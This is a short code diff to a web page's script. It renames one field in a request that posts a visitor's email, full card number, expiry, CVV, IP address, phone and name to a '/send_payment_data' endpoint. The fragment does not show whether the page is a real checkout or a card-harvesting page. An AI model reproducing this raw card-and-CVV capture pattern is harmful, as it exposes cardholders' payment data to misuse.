@@ -208,7 +208,7 @@
             const response = await fetch('/send_payment_data', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ email, card, expiry, cvv, ip, page_code, price, currency, phone, name })
+                body: JSON.stringify({ email, card, expiry, cvv, ip, page: page_code, price, currency, phone, name })
             });
             if (response.ok) {
                 if (!document.getElementById('payment-msg')) {
